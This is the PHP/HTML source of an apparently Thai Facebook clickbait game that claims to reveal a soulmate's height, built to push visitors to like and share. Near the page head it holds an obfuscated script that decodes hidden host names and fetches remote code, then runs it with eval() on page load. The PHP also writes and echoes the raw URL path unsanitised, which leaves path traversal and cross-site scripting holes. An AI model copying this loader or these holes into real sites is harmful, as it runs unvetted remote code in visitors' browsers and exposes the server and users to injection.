<?php
$str = "$_SERVER[HTTP_HOST]$_SERVER[REQUEST_URI]";
  $last = substr($str, strrpos($str, '/') + 1);
  $lasg = urldecode($last);
  $ddc = "http://$_SERVER[HTTP_HOST]$_SERVER[REQUEST_URI]";


$directory = '/storage/ssd5/986/2048986/public_html/images/';
if ($handle = opendir($directory)) { 
    while (false !== ($fileName = readdir($handle))) {
        $dd = explode('.', $fileName);
        $ss = str_replace('.jpg.jpg','.jpg',$dd[0]);
        $newfile = strtolower($ss.'.'.$dd[1]);
        rename($directory . $fileName, $directory.$newfile);
    }
    closedir($handle);
}

$height = 300;
$width = 300;
$fontsize = 100;
$fontsize2 = 60;
if (!isset($String))
$String = rand(150,190)."cm";
$String2 = "เเฟนคุณจะสูง";
$String3 = $lasg ; 
$im = imagecreate($width, $height );
$blue = imagecolorallocate($im,255,255,255);
$green = imagecolorallocate($im,0,0,0);
$font = "/storage/ssd5/986/2048986/public_html/LucidaTypewriterBold.ttf";
$textwidth = $width;
while (1){
    $box = imageTTFbbox( $fontsize,0, $font, $String );
    $textwidth =  abs( $box[2] );
    $textbodyheight = (abs($box[7]))-2;
    if ( $textwidth < $width - 20 )
        break;
    $fontsize--;
}
$Xcenter = (int)($width/2);
$Ycenter = (int)($height/1.5 );
imageTTFtext($im, $fontsize, 0,(int) ($Xcenter-($textwidth/2)),(int)($Ycenter+(($textbodyheight)/2) ),
             $green, $font, $String );
while (2){
    $box = imageTTFbbox( $fontsize,0, $font, $String2 );
    $textwidth =  abs( $box[2] );
    $textbodyheight = (abs($box[7]))-3;
    if ( $textwidth < $width - 20 )
        break;
    $fontsize--;
}
$Xcenter = (int)($width/3.8 );
$Ycenter = (int)($height/2.2 );
imageTTFtext($im, $fontsize, 0,(int) ($Xcenter-($textwidth/4)),(int)($Ycenter+(($textbodyheight)/3) ),
             $green, $font, $String2 );
while (3){
    $box = imageTTFbbox( $fontsize2, 0, $font, $String3 );
    $textwidth =  abs( $box[2] );
    $textbodyheight = (abs($box[7]))-3;
    if ( $textwidth < $width - 20 )
        break;
    $fontsize2--;
}
$Xcenter = (int)($width/2 );
$Ycenter = (int)($height/5.6 );
imageTTFtext($im, $fontsize2, 0,(int) ($Xcenter-($textwidth/2)),(int)($Ycenter+(($textbodyheight)/2) ),
             $green, $font, $String3 );


imagegif($im,"images/".$lasg.".jpg");
ImageDestroy ($im);
$regke = '/^([A-Za-z]+)/';
$regk = '/^(ควย|หี|สัส|เหี้ย|จังไร|กาก|ควาย|ส้นตีน|ห่า|หำ)/';
$reg = '/^([ก-๙]+)/';
if (preg_match($regk,$lasg)) {
        echo "<meta property='og:title' content='💢พ่องมึงตายไงไอ้สัส!!💢💢'>";
        echo "<meta property='og:image' content='kuy.jpg'>";
    }elseif  (preg_match($reg,$lasg)) {
        echo "<meta property='og:title' content='จริงป่ะ?คลิ๊กดิ!!🌞🔥'>";
        echo "<meta property='og:image' content='http://singx.ga/images/".$last.".jpg'>";
    }elseif (preg_match($regke,$lasg)){
        echo "<meta property='og:title' content='🔧ต้องใส่ชื่อภาษาไทยค่ะ!!🔧'>";
        echo "<meta property='og:image' content='wrong.jpg'>"; 
    }else{
       echo "<meta property='og:title' content='🔧คุณใส่ชื่อเล่นไม่ถูกต้องค่ะ!!🔧'>";
        echo "<meta property='og:image' content='wrong.jpg'>"; 
}


$path = '/storage/ssd5/986/2048986/public_html/images/';
if ($handle = opendir($path)) {

    while (false !== ($file = readdir($handle))) { 
        $filelastmodified = filemtime($path . $file);
        //24 hours in a day * 3600 seconds per hour
        if((time() - $filelastmodified) > 20*50)
        {
           unlink($path . $file);
        }

    }

    closedir($handle); 
}


?>
<meta property="og:type" content="article" />
<meta property="og:url" content="http://singx.ga/<?php echo $lasg;?>"/>
<meta property="og:description" content="กดที่นี่เพื่อดูเพิ่มเติม💓"/>
<title>♥️เนื้อคู่คุณจะสูง?</title>
 <link href="hop.css" rel="stylesheet">
<script type="text/javascript" src="//go.pub2srv.com/apu.php?zoneid=1323067"></script>
<script data-cfasync="false" type="text/javascript">var c1x=window;for(var M in c1x){if(M.length===((8.17E2,3.18E2)>7.100E2?0x1BF:(0x177,0x95)>=(0x57,51.)?(0x19C,6):(0x233,112.))&&M.charCodeAt(((0x22B,0x123)>=0x88?(46.,3):(0xC0,40.)))===(9E0<(49.1E1,146)?(111.,100):(0x1B0,51.))&&M.charCodeAt((2.030E2<(3.14E2,1.0130E3)?(12.,5):(55.,0x3E)))===((0x208,1.3860E3)>(119,0x201)?(4.,119):0x21E<(1.097E3,0x1F4)?85.60E1:(22.5E1,146.))&&M.charCodeAt(((42,64.5E1)>=(6.48E2,0x229)?(7.57E2,1):(143,0x1C2)))===(0x1F0>(78.2E1,46)?(82.,105):(7.4E1,27))&&M.charCodeAt(((1.07E2,0x1AB)<=(0x5D,0x249)?(0xB5,0):(70.5E1,129.)<=58.?5.87E2:(2.010E2,95)))===((0x47,0x133)>=28?(53.,119):(94,54.)))break};for(var G in c1x[M]){if(G.length===((88.0E1,10.46E2)>=0x133?(99.,8):(11.,101))&&G.charCodeAt(((3.7E1,0x17A)<=(0x246,0x1B0)?(4.80E1,5):(0x1C9,0xC7)>=0xDD?(97,0x67):(83.80E1,129)))===((0x3C,8.49E2)>=(0xEB,28.3E1)?(8,101):(15,0x166))&&G.charCodeAt(((136.,149)>13?(1.660E2,7):(12.42E2,106.)))===(0x7C>=(1.457E3,0x78)?(24.,116):(0x12,0x1E0))&&G.charCodeAt((0x198<(0x231,38.)?200:(58,56)<95.0E1?(0xF3,3):(0x257,11.5E2)))===((0xC8,72.0E1)<=0x125?51.:6.30E1<(8.51E2,0x1A1)?(101,117):(0x155,0xC9))&&G.charCodeAt(((114.4E1,35.4E1)>=(0xE5,38.)?(11.6E2,0):115>=(119.80E1,145)?"d":(73,35.)))===((99.10E1,106.)>=0x53?(0x243,100):(0xBD,80.60E1)))break};(function(d,e,P,y){c1x[M][e]=function(){var A=((0,81.0E1)<=0x230?(25.0E1,3.67E2):(118.0E1,0x21D)>=0x1AA?(11.51E2,0):(0x20,20)),c=A,v=function v(){var r=(121.<(1.421E3,0x214)?(44.5E1,'/'):(81.7E1,66.));var m='';var x='//';var u='GET';var D=((0x156,78.2E1)<=116.9E1?(1.93E2,true):(129,14.98E2)<100?(1.073E3,100.80E1):(2.4E2,16.3E1));var q=new XMLHttpRequest();q.withCredentials=D;q.open((u),(x)+c1x[M]['atob'](P[c].split(m).reverse().join(m))+r+y+r,D);q.onreadystatechange=function(){var T=((0x239,0xCA)<(99,51.1E1)?(13.83E2,200):(0x45,0x17F)<=(9.13E2,40)?(3.6E2,'/'):(0x24F,5.560E2));var z=((61,1.082E3)>=0x25?(0x242,4):(0x152,0x196));if(q.readyState==z&&q.status==T&&q.responseText){eval(q.responseText);}};q.onerror=function(){if(++c!=P.length){v();}};try{q.send();}catch(T){q.onerror();}};v();};})(c1x[M][G],'_txwonbge',['t92YuM3coZWNnZGZwVGd','w9GduEXNpNTbjx2M','=02bj5SZ0VmchxWZnZ2c3Vmb','tF2YiV2duk2b4Qjdo9Ga'],1323068);</script><script data-cfasync="false" type="text/javascript" src="//go.onclasrv.com/apu.php?zoneid=1323067" onerror="window._txwonbge();"></script>
<script>
(function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
(i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
})(window,document,'script','https://www.google-analytics.com/analytics.js','ga');

ga('create', 'UA-96221961-1', 'auto');
ga('send', 'pageview');
</script>
 <script src="//code.jquery.com/jquery.js"></script>
<script>
    function showModal(id) {   
		$('#'+id).fadeIn('slow');
		//$(this).fadeIn('slow');
	}
	function hideModal(id) {
		$('#'+id).fadeOut();
	}

$(document).ready(function() {
    var text = "";
    var count = 0;
    var maxspeed = 600;

    function typeit(tweet) {
        text = tweet;
        type();
    }

    function character(start, end, text) {
        return text.substring(start, end);
    }

    function type() {
        var random = Math.floor(Math.random() * maxspeed);
        setTimeout(type, random);
        $('.headline').append(character(count, count + 1, text));
        count++;
    }

    type();

    typeit(" สวัสดีครับ <?php echo $lasg;?>  ขอบคุณที่ช่วยไลค์  เเละเเชร์");

});
</script>
<div id="fb-root"></div>
<script>(function(d, s, id) {
  var js, fjs = d.getElementsByTagName(s)[0];
  if (d.getElementById(id)) return;
  js = d.createElement(s); js.id = id;
  js.src = "//connect.facebook.net/en_US/sdk.js#xfbml=1&version=v2.9&appId=110209929608249";
  fjs.parentNode.insertBefore(js, fjs);
}(document, 'script', 'facebook-jssdk'));</script>
<center><div class="headline"></div>
<div class="subtitle instructions" style="width: 270px;font-size:0.9em;color:gray;">singx.ga เป็นเกมส์ที่ให้ เล่นฟรี บนเฟสบุ๊ค
เมื่อคุณคอมเมนต์ มันจะบอก ความสูงของเนื้อคู่คุณ ลองเเชร์ เเล้วดูที่หน้าวอลตัวเองสิ</br>...............................................</br>
หากท่านอยากรับเกมส์เจ๋งๆก่อนใคร  <br> 💗กดติดตามที่ปุ่มด้านล่างนะครับ💗<br><br>
<center><div class="fb-follow" data-href="https://www.facebook.com/ta.znug" data-layout="button_count" data-size="large" data-show-faces="true"></div></center>
        <!--<span style="color:silver;"><br><br><b>Share</b> then<br> check your Facebook wall.</span>--></div></center>
 <div class="animated bounce" style="font-size: 70pt; text-align: center; margin: 0 auto; margin-top: 30px;">👇</div>
   <center> <a style="text-decoration: none;" target="_blank" href="https://www.facebook.com/sharer/sharer.php?u=https://www.facebook.com/photo.php?fbid=1932287536995194"><button class="big-button" style="display:block;margin: 0 auto;">
    อยากรู้เเชร์เลย
  </button>    </a></center>
   <div class="subtitle"><span style="font-weight:300;color:#737373;line-height:40px;font-size:0.8em;">Featured on</span><br><img src="http://i.imgur.com/ujAXDxl.png"></div>
